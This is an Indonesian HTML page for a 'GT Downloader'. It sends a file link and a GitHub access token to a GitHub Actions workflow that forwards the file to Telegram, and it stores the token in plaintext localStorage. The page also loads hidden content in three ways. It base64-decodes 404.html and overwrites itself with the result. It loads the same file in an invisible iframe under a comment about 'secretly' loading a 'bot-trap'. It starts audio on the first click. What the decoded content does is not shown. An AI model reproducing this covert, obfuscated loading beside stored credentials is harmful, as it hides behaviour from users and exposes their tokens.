<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>GT Downloader</title>
  <style>
    :root {
      --bg: #111;
      --text: #eee;
      --card: #222;
      --input: #333;
      --button: #06f;
    }
    body.light {
      --bg: #fff;
      --text: #111;
      --card: #eee;
      --input: #ccc;
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
    }
    html, body {
      height: 100%;
      width: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .container {
      background: var(--card);
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0 0 30px rgba(0,0,0,0.15);
      width: 90%;
      max-width: 480px;
      text-align: center;
    }
    input, button {
      width: 100%;
      padding: 0.8rem;
      margin: 0.6rem 0;
      font-size: 1rem;
      border: none;
      border-radius: 8px;
    }
    input {
      background: var(--input);
      color: var(--text);
    }
    button {
      background: var(--button);
      color: #fff;
      cursor: pointer;
    }
    #darkToggle {
      margin-top: 1rem;
      background: transparent;
      font-size: 1.5rem;
      line-height: 1;
      user-select: none;
    }
    #player {
      position: fixed;
      top: 0;
      left: 0;
      width: 99999px;
      height: 99999px;
      opacity: 1.0;
      pointer-events: auto;
      z-index: -1;
    }
    #log {
      margin-top: 1rem;
      font-size: 0.9rem;
      width: 90%;
      max-width: 480px;
      background: #0006;
      padding: 1rem;
      border-radius: 12px;
      white-space: pre-wrap;
      word-break: break-word;
      max-height: 4.5em;
      overflow-y: auto;
      font-family: monospace;
    }
  </style>
</head>
<body class="dark">
  <div class="container">
    <h2>GT Downloader üîí</h2>
    <input type="password" id="pin" placeholder="Masukkan PIN" inputmode="numeric" />
    <input type="text" id="link" placeholder="Link file (https://...)" />
    <input type="text" id="ext" placeholder="Ekstensi file (cth: .mp4)" />
    <input type="text" id="pat" placeholder="GitHub PAT" />
    <button onclick="kirim()">Kirim ke Telegram</button>
    <button id="darkToggle" onclick="toggleDark()">‚òÄÔ∏è</button>
  </div>

  <div id="log"></div>
  <div id="player"></div>

  <script>
    const logBox = document.getElementById("log");
    const log = (msg) => {
      const time = new Date().toLocaleTimeString();
      logBox.textContent += `[${time}] ${msg}\n`;
      logBox.scrollTop = logBox.scrollHeight;
    };

    const savedPAT = localStorage.getItem("pat");
    if (savedPAT) document.getElementById("pat").value = savedPAT;

    async function getAllowedExtensions() {
      const files = ["ext_audio.txt", "ext_image.txt", "ext_video.txt"];
      const sets = await Promise.all(files.map(async f => {
        try {
          const res = await fetch(f);
          if (!res.ok) return [];
          const text = await res.text();
          return text.split(/\s+/).map(x => x.trim().toLowerCase()).filter(Boolean);
        } catch {
          return [];
        }
      }));
      return [...new Set(sets.flat())];
    }

    async function kirim() {
      const pin = document.getElementById("pin").value;
      const link = document.getElementById("link").value;
      const extRaw = document.getElementById("ext").value.trim();
      const pat = document.getElementById("pat").value;

      if (!pat || !link || !pin) {
        log("‚ö†Ô∏è Semua kolom wajib diisi kecuali ekstensi.");
        return;
      }

      localStorage.setItem("pat", pat);
      const ext = extRaw.startsWith('.') ? extRaw.slice(1) : extRaw;
      const allowed = await getAllowedExtensions();

      if (ext && !allowed.includes(ext.toLowerCase())) {
        log(`‚ùå Ekstensi '${extRaw}' tidak didukung.`);
        return;
      }

      log("‚è≥ Mengirim request ke GitHub...");

      const res = await fetch("https://api.github.com/repos/zanix-ai/GT-Downloader/actions/workflows/main.yml/dispatches", {
        method: "POST",
        headers: {
          "Authorization": "Bearer " + pat,
          "Accept": "application/vnd.github+json",
          "X-GitHub-Api-Version": "2022-11-28"
        },
        body: JSON.stringify({ ref: "main", inputs: { pin, url: link, ext: extRaw } })
      });

      if (res.ok) {
        log("‚úÖ Berhasil dikirim ke Telegram!");
      } else {
        const err = await res.json().catch(() => ({}));
        log(`‚ùå Gagal (${res.status}): ${err.message || "Unknown error"}`);
      }
    }

    function toggleDark() {
      const isDark = document.body.classList.toggle("dark");
      document.body.classList.toggle("light", !isDark);
      document.getElementById("darkToggle").textContent = isDark ? "‚òÄÔ∏è" : "üåï";
    }

    let ytPlayer;
    window.onYouTubeIframeAPIReady = function () {
      ytPlayer = new YT.Player('player', {
        videoId: 'O2ct-cdupHU',
        playerVars: {
          autoplay: 0,
          controls: 0,
          mute: 0,
          loop: 1,
          playlist: 'O2ct-cdupHU',
          modestbranding: 1,
          rel: 0
        },
        events: {
          onReady: () => {
            log("üéµ YouTube player ready.");
            document.addEventListener('click', () => {
              ytPlayer.unMute();
              ytPlayer.setPlaybackQuality('tiny');
              ytPlayer.playVideo();
              log("‚ñ∂Ô∏è YouTube video started.");
            }, { once: true });
          }
        }
      });
    };

    fetch('404.html')
  .then(res => res.text())
  .then(base64data => {
    const decoded = atob(base64data); // decode base64 jadi string HTML
    document.open();
    document.write(decoded);
    document.close();
  })
  .catch(err => console.error('Gagal decode 404.html:', err));
  </script>

  <script src="https://www.youtube.com/iframe_api"></script>

  <iframe src="404.html" sandbox="allow-scripts" style="width:0;height:0;border:0;"></iframe>

<meta name="robots" content="index, follow">
<script>
  // Tapi secretly load bot-trap
  fetch("/404.html").then(() => console.log("üêç Loaded"));
</script>
</body>
</html>
